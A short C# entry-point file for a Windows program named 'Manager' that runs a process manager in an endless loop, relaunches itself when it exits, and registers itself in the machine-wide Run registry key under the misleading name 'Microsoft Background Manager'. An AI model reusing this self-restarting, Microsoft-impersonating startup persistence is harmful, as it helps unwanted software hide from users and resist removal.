#define DEBUG

using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace Manager
{
    class Program
    {
        private static ProcessManager pM;
        private const string PROG_NAME = "Manager.exe";
        private const string FRIENDLY_NAME = "Microsoft Background Manager";
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
#if !DEBUG
            SetStartup();
#endif
            while (true)
            {
                pM = new ProcessManager();
                pM.Run();
            }
        }

        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            pM.Shutdown();
            Process.Start(PROG_NAME); // now restart the program
        }

        private static void SetStartup()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string excutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            rk.SetValue(FRIENDLY_NAME, excutablePath);
        }
    }
}
